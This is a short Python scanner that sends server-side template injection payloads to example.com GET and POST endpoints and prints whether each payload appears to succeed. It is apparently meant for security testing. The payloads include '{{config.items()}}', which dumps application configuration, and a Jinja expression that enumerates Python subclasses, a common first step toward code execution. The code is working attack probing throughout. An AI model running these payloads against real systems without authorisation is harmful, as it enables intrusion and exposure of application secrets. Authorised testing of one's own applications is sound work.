import requests

url_get = "https://example.com/hello?name="
url_post = "https://example.com/feedback"

payloads = [
    "{{7*7}}",
    "{{config.items()}}",
    "{% for c in [].__class__.__base__.__subclasses__() %}{{c}}{% endfor %}"
]

def test_ssti_get(url):
    print("[+] Starting SSTI GET Test...")
    for payload in payloads:
        target = url + payload
        response = requests.get(target)

        if "49" in response.text or "config" in response.text or "__subclasses__" in response.text:
            print(f"[+] SSTI was found! Payload: {payload}")
        else:
            print(f"[-] Safe: Payload: {payload}")

def test_ssti_post(url):
    print("[+] Starting SSTI POST Test...")
    for payload in payloads:
        data = {"message": payload}
        response = requests.post(url, data=data)

        if "49" in response.text or "config" in response.text or "__subclasses__" in response.text:
            print(f"[+] SSTI was found: Payload: {payload}")
        else:
            print(f"[-] Safe: {payload}")

if __name__ == "__main__":
    test_ssti_get(url_get)
    test_ssti_post(url_post)
